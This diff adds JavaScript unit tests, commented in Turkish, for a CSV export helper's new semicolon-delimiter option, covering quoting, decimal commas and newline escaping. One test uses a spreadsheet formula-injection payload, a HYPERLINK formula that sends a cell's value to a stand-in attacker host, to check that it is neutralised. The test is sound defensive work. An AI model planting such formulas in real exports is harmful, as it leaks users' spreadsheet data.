@@ -99,3 +99,43 @@ test("csvNumber çıktısı buildCsv'den geçince tırnaklanır — kolon kaymaz
   // kolona bölünürdü. RFC 4180 tırnaklaması bunu kapatıyor.
   assert.equal(buildCsv(["Maliyet"], [[csvNumber(46239.2)]]), 'Maliyet\n"46239,20"');
 });
+
+// ── Alan ayracı parametre (QA denetimi 2026-08-28 — KOLON KAYMASI) ──
+
+test("varsayılan ayraç ',' — mevcut çıktılar (ReportCenterView) DEĞİŞMEZ", () => {
+  assert.equal(buildCsv(["a", "b"], [[1, 2]]), "a,b\n1,2");
+  assert.equal(csvEscape("a,b"), '"a,b"');
+  assert.equal(csvEscape("ARAS;KARGO"), "ARAS;KARGO", "virgül dosyasında ';' masum");
+});
+
+test("';' ayracında ';' içeren hücre TIRNAKLANIYOR", () => {
+  // Ölçüldü: `csvEscape("ARAS;KARGO")` ayraçsız çağrıda tırnaklanmıyordu ve
+  // noktalı virgülle yazan ekranda hücre iki kolona bölünüyordu.
+  assert.equal(csvEscape("ARAS;KARGO", ";"), '"ARAS;KARGO"');
+  assert.equal(
+    buildCsv(["Hesap", "Adet"], [["ARAS;KARGO", 5]], { delimiter: ";" }),
+    'Hesap;Adet\n"ARAS;KARGO";5'
+  );
+});
+
+test("';' ayracında VİRGÜL artık tırnak gerektirmiyor — ondalık sayı sade kalır", () => {
+  // `46239,20` noktalı virgüllü dosyada tek hücre; gereksiz tırnak Excel'de
+  // sayıyı metne çevirme riskini artırır.
+  assert.equal(csvEscape(csvNumber(46239.2), ";"), "46239,20");
+  assert.equal(buildCsv(["Tutar"], [[csvNumber(46239.2)]], { delimiter: ";" }), "Tutar\n46239,20");
+});
+
+test("';' ayracında da formül koruması ve negatif muafiyeti aynı", () => {
+  const payload = '=HYPERLINK("https://evil.tld/?d="&A1;"Ac")';
+  const escaped = csvEscape(payload, ";");
+  assert.ok(escaped.startsWith("\"'="), "formül öneki + tırnak");
+  assert.ok(!escaped.includes('"Ac")') || escaped.includes('""Ac""'), "iç tırnaklar ikilendi");
+  // Negatif sayı muafiyeti ayraçtan bağımsız korunuyor.
+  assert.equal(csvEscape(csvNumber(-372), ";"), "-372,00");
+  assert.equal(csvEscape("-2+3", ";"), "'-2+3");
+});
+
+test("satırsonu ve tırnak ayraçtan BAĞIMSIZ olarak tırnaklanıyor", () => {
+  assert.equal(csvEscape("iki\nsatır", ";"), '"iki\nsatır"');
+  assert.equal(csvEscape('de "mi"', ";"), '"de ""mi"""');
+});
